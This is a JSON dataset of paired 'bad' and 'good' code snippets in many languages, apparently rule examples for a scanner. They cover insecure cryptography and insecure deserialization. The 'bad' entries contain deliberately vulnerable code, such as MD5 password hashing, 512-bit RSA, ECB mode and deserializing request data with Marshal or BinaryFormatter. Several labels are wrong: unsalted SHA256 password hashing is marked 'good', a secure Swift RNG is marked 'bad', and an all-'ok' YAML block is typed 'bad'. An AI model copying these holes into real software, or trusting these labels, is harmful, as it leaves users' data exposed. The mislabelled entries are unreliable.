    "code": "import \"crypto/rand\"\n\ngood, _ := rand.Read(nil)",
    "language": "go",
    "description": "Go - secure random"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "require 'digest'\n\nmd5 = Digest::MD5.hexdigest 'abc'\nmd5 = Digest::MD5.new\nmd5 = Digest::MD5.base64digest 'abc'\nmd5 = Digest::MD5.digest 'abc'\n\ndigest = OpenSSL::Digest::MD5.new\ndigest = OpenSSL::Digest::MD5.hexdigest 'abc'\ndigest = OpenSSL::Digest::MD5.base64digest 'abc'\ndigest = OpenSSL::Digest::MD5.digest 'abc'",
    "language": "ruby",
    "description": "Ruby - MD5 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "require 'digest'\n\nsha = Digest::SHA1.hexdigest 'abc'\nsha = Digest::SHA1.new\nsha = Digest::SHA1.base64digest 'abc'\nsha = Digest::SHA1.digest 'abc'\n\ndigest = OpenSSL::Digest::SHA1.new\ndigest = OpenSSL::Digest::SHA1.hexdigest 'abc'\nOpenSSL::HMAC.hexdigest(\"sha1\", key, data)",
    "language": "ruby",
    "description": "Ruby - SHA1 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "require 'digest'\n\ndigest = OpenSSL::Digest::SHA256.new\ndigest = OpenSSL::Digest::SHA256.hexdigest 'abc'\nOpenSSL::HMAC.hexdigest(\"SHA256\", key, data)\n\nuser.set_password Digest::SHA256.hexdigest pwtext",
    "language": "ruby",
    "description": "Ruby - SHA256 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "require 'digest'\n\ndef ex1 (user, pwtext)\n    user.set_password Digest::MD5.hexdigest pwtext\nend\n\ndef ex2 (user, pwtext)\n    md5 = Digest::MD5.new\n    md5.update pwtext\n    md5 << salt(pwtext)\n    dig = md5.hexdigest\n    user.set_password dig\nend",
    "language": "ruby",
    "description": "Ruby - MD5 for password hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "require 'digest'\n\ndef ok1 (user, pwtext)\n    user.set_password Digest::SHA256.hexdigest pwtext\nend\n\ndef ok2 (user, pwtext)\n    sha = Digest::SHA256.new\n    sha.update pwtext\n    sha << salt(pwtext)\n    dig = sha.hexdigest\n    user.set_password dig\nend",
    "language": "ruby",
    "description": "Ruby - SHA256 for password hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "class Test\n    $key = 512\n    @key2 = 512\n\n    OpenSSL::PKey::RSA.new(@key2)\n    OpenSSL::PKey::RSA.new 512\n    key = OpenSSL::PKey::RSA.new($key)\nend",
    "language": "ruby",
    "description": "Ruby - weak RSA key size"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "class Test\n    $pass1 = 2048\n    @pass2 = 2048\n\n    key = OpenSSL::PKey::RSA.new($pass1)\n    key = OpenSSL::PKey::RSA.new(@pass2)\n    key = OpenSSL::PKey::RSA.new(2048)\nend",
    "language": "ruby",
    "description": "Ruby - strong RSA key size"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import java.security.MessageDigest\nimport org.apache.commons.codec.digest.DigestUtils\n\npublic fun md5(password: String): ByteArray {\n    val md5Digest: MessageDigest = MessageDigest.getInstance(\"MD5\")\n    md5Digest.update(password.getBytes())\n    val hashValue: ByteArray = md5Digest.digest()\n    return hashValue\n}\n\npublic fun md5_digestutil(password: String): ByteArray {\n    val hashValue: ByteArray = DigestUtils.getMd5Digest().digest(password.getBytes())\n    return hashValue\n}",
    "language": "kotlin",
    "description": "Kotlin - MD5 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import java.security.MessageDigest\nimport org.apache.commons.codec.digest.DigestUtils\n\nvar sha1Digest: MessageDigest = MessageDigest.getInstance(\"SHA1\")\nvar sha1Digest: MessageDigest = MessageDigest.getInstance(\"SHA-1\")\nval hashValue: Array<Byte> = DigestUtils.getSha1Digest().digest(password.getBytes())",
    "language": "kotlin",
    "description": "Kotlin - SHA1 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "import java.security.MessageDigest\n\nval sha256Digest: MessageDigest = MessageDigest.getInstance(\"SHA256\")\nsha256Digest.update(password.getBytes())\nval hashValue: ByteArray = sha256Digest.digest()",
    "language": "kotlin",
    "description": "Kotlin - SHA256 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "class ECBCipher {\n  public fun ecbCipher(): Void {\n    val c: Cipher = Cipher.getInstance(\"AES/ECB/NoPadding\")\n    c.init(Cipher.ENCRYPT_MODE, k, iv)\n    val cipherText = c.doFinal(plainText)\n  }\n\n  public fun ecbCipher2(): Void {\n    var c = Cipher.getInstance(\"AES/ECB/NoPadding\")\n    c.init(Cipher.ENCRYPT_MODE, k, iv)\n    val cipherText = c.doFinal(plainText)\n  }\n}",
    "language": "kotlin",
    "description": "Kotlin - ECB mode"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "class ECBCipher {\n  public fun noEcbCipher(): Void {\n    var c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    c.init(Cipher.ENCRYPT_MODE, k, iv)\n    val cipherText = c.doFinal(plainText)\n  }\n}",
    "language": "kotlin",
    "description": "Kotlin - GCM mode"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import java.security.KeyPairGenerator\n\nfun rsaWeak(): Void {\n    val keyGen: KeyPairGenerator = KeyPairGenerator.getInstance(\"RSA\")\n    keyGen.initialize(512)\n}",
    "language": "kotlin",
    "description": "Kotlin - weak RSA key size"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "import java.security.KeyPairGenerator\n\nfun rsaOK(): Void {\n    val keyGen = KeyPairGenerator.getInstance(\"RSA\");\n    keyGen.initialize(2048);\n}",
    "language": "kotlin",
    "description": "Kotlin - strong RSA key size"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "using System.Security.Cryptography;\n\npublic void CreateDES1() {\n    var key = DES.Create();\n}\n\npublic void CreateDES2() {\n    var key = DES.Create(\"ImplementationName\");\n}\n\npublic void CreateRC21() {\n    var key = RC2.Create();\n}\n\npublic void CreateRC22() {\n    var key = RC2.Create(\"ImplementationName\");\n}",
    "language": "csharp",
    "description": "C# - DES or RC2 cipher"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "using System.Security.Cryptography;\n\npublic void CreateAes1() {\n    var key = Aes.Create();\n}\n\npublic void CreateAes2() {\n    var key = Aes.Create(\"ImplementationName\");\n}",
    "language": "csharp",
    "description": "C# - AES cipher"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "using System.Security.Cryptography;\n\npublic void EncryptWithAesEcb() {\n    Aes key = Aes.Create();\n    key.Mode = CipherMode.ECB;\n    using var encryptor = key.CreateEncryptor();\n    byte[] msg = new byte[32];\n    var cipherText = encryptor.TransformFinalBlock(msg, 0, msg.Length);\n}\n\npublic void EncryptWithAesEcb2() {\n    Aes key = Aes.Create();\n    byte[] msg = new byte[32];\n    var cipherText = key.EncryptEcb(msg, PaddingMode.PKCS7);\n}",
    "language": "csharp",
    "description": "C# - ECB mode"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "using System.Security.Cryptography;\n\npublic void EncryptWithAesCbc() {\n    Aes key = Aes.Create();\n    key.Mode = CipherMode.CBC;\n    using var encryptor = key.CreateEncryptor();\n    byte[] msg = new byte[32];\n    var cipherText = encryptor.TransformFinalBlock(msg, 0, msg.Length);\n}\n\npublic void EncryptWithAesCbc2() {\n    Aes key = Aes.Create();\n    byte[] msg = new byte[32];\n    byte[] iv = new byte[16];\n    var cipherText = key.EncryptCbc(msg, iv, PaddingMode.PKCS7);\n}",
    "language": "csharp",
    "description": "C# - CBC mode"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "using System.Security.Cryptography;\n\npublic void GenerateBadKey() {\n    var rng = new System.Random();\n    byte[] key = new byte[16];\n    rng.NextBytes(key);\n    SymmetricAlgorithm cipher = Aes.Create();\n    cipher.Key = key;\n}\n\npublic void GenerateBadKeyGcm() {\n    var rng = new System.Random();\n    byte[] key = new byte[16];\n    rng.NextBytes(key);\n    var cipher = new AesGcm(key);\n}",
    "language": "csharp",
    "description": "C# - weak RNG for key generation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "using System.Security.Cryptography;\n\npublic void GenerateGoodKey() {\n    var rng = System.Security.Cryptography.RandomNumberGenerator.Create();\n    byte[] key = new byte[16];\n    rng.GetBytes(key);\n    var cipher = Aes.Create();\n    cipher.Key = key;\n}\n\npublic void GenerateGoodKeyGcm() {\n    var rng = System.Security.Cryptography.RandomNumberGenerator.Create();\n    byte[] key = new byte[16];\n    rng.GetBytes(key);\n    var cipher = new AesGcm(key);\n}",
    "language": "csharp",
    "description": "C# - secure RNG for key generation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "<?php\n\n$hashed_password = crypt('mypassword');\n$hashed_password = md5('mypassword');\n$hashed_password = md5_file('filename.txt');\n$hashed_password = sha1('mypassword');\n$hashed_password = sha1_file('filename.txt');\n$hashed_password = str_rot13('totally secure');",
    "language": "php",
    "description": "PHP - weak crypto functions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "<?php\n\n$hashed_password = sodium_crypto_generichash('mypassword');",
    "language": "php",
    "description": "PHP - secure hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "<?php\n\nfunction test1($value) {\n    $pass = md5($value);\n    $user->setPassword($pass);\n}\n\nfunction test2($value) {\n    $pass = hash('md5', $value);\n    $user->setPassword($pass);\n}",
    "language": "php",
    "description": "PHP - MD5 for password hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "<?php\n\nfunction okTest1($value) {\n    $pass = hash('sha256', $value);\n    $user->setPassword($pass);\n}",
    "language": "php",
    "description": "PHP - SHA256 for password hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import Foundation\n\nfunc example() -> Void {\n    let randomInt = Int.random(in: 0..<6)\n    let randomDouble = Double.random(in: 2.71828...3.14159)\n    let randomBool = Bool.random()\n    let diceRoll = Int(arc4random_uniform(6) + 1)\n    let a = Int.random(in: 0 ... 10)\n    var k: Int = random() % 10;\n    let randomNumber = arc4random()\n    arc4random_buf(&r, MemoryLayout<Self>.size)\n    let x = Int.random(in: 1...100)\n    var g = SystemRandomNumberGenerator()\n    let y = Int.random(in: 1...100, using: &g)\n}",
    "language": "swift",
    "description": "Swift - insecure random number generators"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "import Security\n\nvar randomBytes = [UInt8](repeating: 0, count: 16)\nlet status = SecRandomCopyBytes(kSecRandomDefault, randomBytes.count, &randomBytes)",
    "language": "swift",
    "description": "Swift - SecCopyRandomBytes"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "class Test {\n  def bad1() {\n    import scala.util.Random\n\n    val result = Seq.fill(16)(Random.nextInt)\n    return result.map(\"%02x\" format _).mkString\n  }\n}",
    "language": "scala",
    "description": "Scala - insecure random number generator"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "class Test {\n  def ok1() {\n    import java.security.SecureRandom\n\n    val rand = new SecureRandom()\n    val value = Array.ofDim[Byte](16)\n    rand.nextBytes(value)\n    return value.map(\"%02x\" format _).mkString\n  }\n}",
    "language": "scala",
    "description": "Scala - SecureRandom"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "class RSACipher {\n  def badRSACipher(): Void =\n    try {\n      val c = Cipher.getInstance(\"RSA/None/NoPadding\")\n      c.init(Cipher.ENCRYPT_MODE, k, iv)\n      val cipherText = c.doFinal(plainText)\n    } catch {\n      case NonFatal(e) => throw new RuntimeException(\"Encrypt error\", e)\n    }\n}",
    "language": "scala",
    "description": "Scala - RSA without OAEP padding"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "class RSACipher {\n  def okRSACipher(): Void =\n    try {\n      var c = Cipher.getInstance(\"RSA/ECB/OAEPWithMD5AndMGF1Padding\")\n      c.init(Cipher.ENCRYPT_MODE, k, iv)\n      val cipherText = c.doFinal(plainText)\n    } catch {\n      case NonFatal(e) => throw new RuntimeException(\"Encrypt error\", e)\n    }\n}",
    "language": "scala",
    "description": "Scala - RSA with OAEP padding"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "use md2::{Md2};\nuse md4::{Md4};\nuse md5::{Md5};\nuse sha1::{Sha1};\n\nlet mut hasher = Md2::new();\nlet mut hasher = Md4::new();\nlet mut hasher = Md5::new();\nlet mut hasher = Sha1::new();",
    "language": "rust",
    "description": "Rust - insecure hash algorithms"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "use sha2::{Sha256};\n\nlet mut hasher = Sha256::new();",
    "language": "rust",
    "description": "Rust - SHA256 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "def ok_deserialization\n   o = Klass.new(\"hello\\n\")\n   data = YAML.dump(o)\n   # ok: bad-deserialization-yaml\n   obj = YAML.load(data, safe: true)\n\n   filename = File.read(\"test.txt\")\n   data = YAML.dump(filename)\n   # ok: bad-deserialization-yaml\n   YAML.load(filename)\n\n   # ok: bad-deserialization-yaml\n   YAML.load(File.read(\"test.txt\"))\n\n   # ok: bad-deserialization-yaml\n   obj = YAML::load(ERB.new(File.read(\"test.yml\")).result)\n\n   # ok: bad-deserialization-yaml\n   obj = YAML::load(ERB.new(File.read(\"test.yml\")))\n\n   template = ERB.new(File.read(\"test.yml\"))\n   # ok: bad-deserialization-yaml\n   obj = YAML::load(template)\n\n   template = ERB.new(File.read(\"test.yml\")).result\n   # ok: bad-deserialization-yaml\n   obj = YAML::load(template)\n\n   template = ERB.new(File.read(\"test.yml\"))\n   # ok: bad-deserialization-yaml\n   obj = YAML::load(template.result)\n\n   # ok: bad-deserialization-yaml\n   obj = YAML.load(File.read(File.join(Pathname.pwd, \"hello.yml\")))\nend",
    "language": "ruby",
    "description": "vulnerable to code execution via YAML.load"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": " def bad_deserialization\n    o = Klass.new(\"hello\\n\")\n    data = params['data']\n    # ruleid: bad-deserialization\n    obj = Marshal.load(data)\n\n    o = Klass.new(params['hello'])\n    data = CSV.dump(o)\n    # ruleid: bad-deserialization\n    obj = CSV.load(data)\n\n    o = Klass.new(\"hello\\n\")\n    data = cookies['some_field']\n    # ruleid: bad-deserialization\n    obj = Oj.object_load(data)\n    # ruleid: bad-deserialization\n    obj = Oj.load(data)\n end",
    "language": "ruby",
    "description": "deserializing user-controlled data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": " def ok_deserialization\n    o = Klass.new(\"hello\\n\")\n    data = YAML.dump(o)\n    # ok: bad-deserialization\n    obj = YAML.load(data, safe: true)\n\n    filename = File.read(\"test.txt\")\n    data = YAML.dump(filename)\n    # ok: bad-deserialization\n    YAML.load(filename)\n\n    # ok: bad-deserialization\n    YAML.load(File.read(\"test.txt\"))\n\n   # ok: bad-deserialization\n   obj = Oj.load(data,options=some_safe_options)\n end",
    "language": "ruby",
    "description": "use safe options or trusted data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": " def bad_deserialization\n   data = request.env[:name]\n   # ruleid: bad-deserialization-env\n   obj = Marshal.load(data)\n\n   o = Klass.new(request.env[:name])\n   data = CSV.dump(o)\n   # ruleid: bad-deserialization-env\n   obj = CSV.load(data)\n\n   o = Klass.new(\"hello\\n\")\n   data = request.env[:name]\n   # ruleid: bad-deserialization-env\n   obj = Oj.object_load(data)\n   # ruleid: bad-deserialization-env\n   obj = Oj.load(data)\n end",
    "language": "ruby",
    "description": "deserializing request environment data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": " def ok_deserialization\n    o = Klass.new(\"hello\\n\")\n    data = CSV.dump(o)\n    # ok: bad-deserialization-env\n    obj = CSV.load(data)\n\n    data = get_safe_data()\n    # ok: bad-deserialization-env\n    obj = Marshal.load(data)\n\n   # ok: bad-deserialization-env\n   obj = Oj.load(data,options=some_safe_options)\n end",
    "language": "ruby",
    "description": "use trusted data sources"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "def handler(event:, context:)\n\tfoobar = event['smth']\n\n    # ruleid: tainted-deserialization\n    obj1 = Marshal.load(foobar)\n\n    data = event['body']['object']\n    # ruleid: tainted-deserialization\n    obj2 = YAML.load(data)\n\n    # ruleid: tainted-deserialization\n    obj3 = CSV.load(\"o:\" + event['data'])\nend",
    "language": "ruby",
    "description": "deserializing Lambda event data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "def ok_handler(event:, context:)\n\n    # ok: tainted-deserialization\n    obj1 = Marshal.load(Marshal.dump(Foobar.new))\n\n    data = \"hardcoded_value\"\n    # ok: tainted-deserialization\n    obj2 = YAML.load(data)\n\n    # ok: tainted-deserialization\n    obj3 = CSV.load(get_safe_data())\nend",
    "language": "ruby",
    "description": "use hardcoded or safe data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "var node_serialize = require(\"node-serialize\")\nvar serialize_to_js = require('serialize-to-js');\n\nmodule.exports.value = function (req,res){\n\t// ruleid: express-third-party-object-deserialization\n\tnode_serialize.unserialize(req.files.products.data.toString('utf8'))\n}\n\n\nmodule.exports.value1 = function (req,res){\n\tvar str = new Buffer(req.cookies.profile, 'base64').toString();\n\t// ruleid: express-third-party-object-deserialization\n\tserialize_to_js.deserialize(str)\n}",
    "language": "typescript",
    "description": "using insecure deserialization libraries"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "var node_serialize = require(\"node-serialize\")\nvar serialize_to_js = require('serialize-to-js');\n\nmodule.exports.value = function (req,res){\n\t// ok: express-third-party-object-deserialization\n\tfake.unserialize(req.files)\n}\n\n\nmodule.exports.value1 = function (req,res){\n\tvar str = new Buffer(req.cookies.profile, 'base64').toString();\n\t// ok: express-third-party-object-deserialization\n\tfoo.deserialize(str)\n}",
    "language": "typescript",
    "description": "use safe alternatives like JSON.parse"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "function test1() {\n    // ruleid: grpc-nodejs-insecure-connection\n    var grpc = require('grpc');\n\n    var booksProto = grpc.load('books.proto');\n\n    var client = new booksProto.books.BookService('127.0.0.1:50051', grpc.credentials.createInsecure());\n\n    client.list({}, function(error, books) {\n        if (error)\n            console.log('Error: ', error);\n        else\n            console.log(books);\n    });\n}\n\nfunction test2() {\n    // ruleid: grpc-nodejs-insecure-connection\n    var {credentials, load, Client} = require('grpc');\n\n    var creds = someFunc() || credentials.createInsecure();\n\n    var client = new Client('127.0.0.1:50051', creds);\n\n    client.list({}, function(error, books) {\n        if (error)\n            console.log('Error: ', error);\n        else\n            console.log(books);\n    });\n}\n\nfunction test3() {\n    // ruleid: grpc-nodejs-insecure-connection\n    var grpc = require('grpc');\n\n    var booksProto = grpc.load('books.proto');\n\n    var server = new grpc.Server();\n\n    server.addProtoService(booksProto.books.BookService.service, {});\n\n    server.bind('0.0.0.0:50051', grpc.ServerCredentials.createInsecure());\n    server.start();\n}",
    "language": "javascript",
    "description": "creating insecure gRPC connections"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "function testOk1() {\n    // ok: grpc-nodejs-insecure-connection\n    var {credentials, Client} = require('grpc');\n    var channel_creds = credentials.createSsl(root_certs);\n    var client = new Client(address, channel_creds);\n\n    client.list({}, function(error, books) {\n        if (error)\n            console.log('Error: ', error);\n        else\n            console.log(books);\n    });\n}",
    "language": "javascript",
    "description": "use SSL/TLS credentials"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "using System.Runtime.Serialization.Formatters.Binary;\n\nnamespace InsecureDeserialization\n{\n    public class InsecureBinaryFormatterDeserialization\n    {\n        public void BinaryFormatterDeserialization(string json)\n        {\n            try\n            {\n                // ruleid: insecure-binaryformatter-deserialization\n                BinaryFormatter binaryFormatter = new BinaryFormatter();\n\n                MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(json));\n                binaryFormatter.Deserialize(memoryStream);\n                memoryStream.Close();\n            }\n            catch (Exception e)\n            {\n                Console.WriteLine(e);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "using BinaryFormatter which is inherently insecure"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "using System.Web.UI;\n\nnamespace InsecureDeserialization\n{\n    public class InsecureLosFormatterDeserialization\n    {\n        public void LosFormatterDeserialization(string json)\n        {\n            try\n            {\n                // ruleid: insecure-losformatter-deserialization\n                LosFormatter losFormatter = new LosFormatter();\n                object obj = losFormatter.Deserialize(json);\n            }\n            catch (Exception e)\n            {\n                Console.WriteLine(e);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "using LosFormatter which is inherently insecure"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "using Newtonsoft.Json;\n\nnamespace InsecureDeserialization\n{\n    public class InsecureNewtonsoftDeserialization\n    {\n        public void NewtonsoftDeserialization(string json)\n        {\n            try\n            {\n                JsonConvert.DeserializeObject<object>(json, new JsonSerializerSettings\n                {\n                    // ruleid: insecure-newtonsoft-deserialization\n                    TypeNameHandling = TypeNameHandling.All\n                });\n            } catch(Exception e)\n            {\n                Console.WriteLine(e);\n            }\n        }\n\n        public void ConverterOverrideSettings(){\n            JsonConvert.DefaultSettings = () =>\n                //ruleid: insecure-newtonsoft-deserialization\n                new JsonSerializerSettings{TypeNameHandling = TypeNameHandling.Auto};\n            Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson);\n        }\n\n        public void ConverterOverrideSettingsStaggeredInitialize(){\n            var settings = new JsonSerializerSettings();\n            //ruleid: insecure-newtonsoft-deserialization\n            settings.TypeNameHandling = TypeNameHandling.Auto;\n            Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson,settings);\n        }\n\n        public void ConverterOverrideSettingsMultipleSettingArgs(){\n            JsonConvert.DefaultSettings = () =>\n                new JsonSerializerSettings{\n                    Culture = InvariantCulture,\n                    //ruleid: insecure-newtonsoft-deserialization\n                    TypeNameHandling = TypeNameHandling.Auto,\n                    TraceWriter = traceWriter\n                    };\n            Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson);\n        }\n    }\n}",
    "language": "csharp",
    "description": "using unsafe TypeNameHandling settings"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "using Newtonsoft.Json;\n\nnamespace InsecureDeserialization\n{\n    public class InsecureNewtonsoftDeserialization\n    {\n      public void SafeDeserialize(){\n        Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson, new JsonSerializerSettings\n        {\n            //ok: insecure-newtonsoft-deserialization\n            TypeNameHandling = TypeNameHandling.None\n        });\n      }\n\n      public void SafeDefaults(){\n        //ok: insecure-newtonsoft-deserialization\n        Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson);\n      }\n    }\n}",
    "language": "csharp",
    "description": "use TypeNameHandling.None or use custom SerializationBinder"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "using MBrace.FsPickler.Json;\n\nnamespace InsecureDeserialization\n{\n    public class InsecureFsPicklerDeserialization\n    {\n        public void FsPicklerDeserialization(string json)\n        {\n            try\n            {\n                // ruleid: insecure-fspickler-deserialization\n                var fsPickler = FsPickler.CreateJsonSerializer();\n                MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(json));\n                fsPickler.Deserialize<object>(memoryStream);\n            }\n            catch (Exception e)\n            {\n                Console.WriteLine(e);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "using FsPickler with default configuration"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "using System.Runtime.Serialization;\n\nnamespace InsecureDeserialization\n{\n    public class InsecureNetDataContractDeserialization\n    {\n        public void NetDataContractDeserialization(string json)\n        {\n            try\n            {\n                MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(json));\n\n                // ruleid: insecure-netdatacontract-deserialization\n                NetDataContractSerializer netDataContractSerializer = new NetDataContractSerializer();\n                object obj = netDataContractSerializer.Deserialize(ms);\n                Console.WriteLine(obj);\n            }\n            catch (Exception e)\n            {\n                Console.WriteLine(e);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "using NetDataContractSerializer which is inherently insecure"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "using System.Runtime.Serialization.Formatters.Soap;\n\nnamespace InsecureDeserialization\n{\n    public class InsecureSoapFormatterDeserialization\n    {\n        public void SoapFormatterDeserialization(string json)\n        {\n            try\n            {\n                MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(json));\n\n                // ruleid: insecure-soapformatter-deserialization\n                SoapFormatter soapFormatter = new SoapFormatter();\n                object obj = soapFormatter.Deserialize(ms);\n            }\n            catch (Exception e)\n            {\n                Console.WriteLine(e);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "using SoapFormatter which is inherently insecure"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "namespace InsecureDeserialization\n{\n    public class InsecureTypeFilterLevel\n    {\n        public void SetTFL(string json)\n        {\n            BinaryServerFormatterSinkProvider serverProvider = new BinaryServerFormatterSinkProvider(formatterProps, null);\n\n            // ruleid: insecure-typefilterlevel-full\n            serverProvider.TypeFilterLevel = System.Runtime.Serialization.Formatters.TypeFilterLevel.Full;\n\n            // ruleid: insecure-typefilterlevel-full\n            var provider = new BinaryServerFormatterSinkProvider { TypeFilterLevel = TypeFilterLevel.Full };\n\n            var dict = new Hashtable();\n            dict[\"typeFilterLevel\"] = \"Full\";\n            // ruleid: insecure-typefilterlevel-full\n            BinaryServerFormatterSinkProvider serverProvider2 = new BinaryServerFormatterSinkProvider(dict, null);\n        }\n    }\n}",
    "language": "csharp",
    "description": "using TypeFilterLevel.Full in .NET Remoting"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "using fastJSON;\n\nnamespace InsecureDeserialization\n{\n    public class InsecureFastJSONDeserialization\n    {\n        public void FastJSONDeserialization(string json)\n        {\n            try\n            {\n                // ruleid: insecure-fastjson-deserialization\n                var obj = JSON.ToObject(json, new JSONParameters { BadListTypeChecking = false });\n            }\n            catch (Exception e)\n            {\n                Console.WriteLine(e);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "using FastJSON with BadListTypeChecking disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "using System.Web.Script.Serialization;\n\nnamespace InsecureDeserialization\n{\n    public class InsecureJavascriptSerializerDeserialization\n    {\n        public void JavascriptSerializerDeserialization(string json)\n        {\n            try\n            {\n                // ruleid: insecure-javascriptserializer-deserialization\n                var serializer = new JavaScriptSerializer(new SimpleTypeResolver());\n                serializer.DeserializeObject(json);\n\n                var resolver = new SimpleTypeResolver()\n                // ruleid: insecure-javascriptserializer-deserialization\n                var serializer2 = new JavaScriptSerializer(resolver);\n                serializer2.DeserializeObject(json);\n            }\n            catch (Exception e)\n            {\n                Console.WriteLine(e);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "using SimpleTypeResolver which is inherently insecure"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "namespace DCR\n{\n    // ruleid: data-contract-resolver\n    class MyDCR : DataContractResolver\n    {\n        public void ResolveDataContract()\n        {\n\n        }\n    }\n}",
    "language": "csharp",
    "description": "implementing custom DataContractResolver"
  },
  {
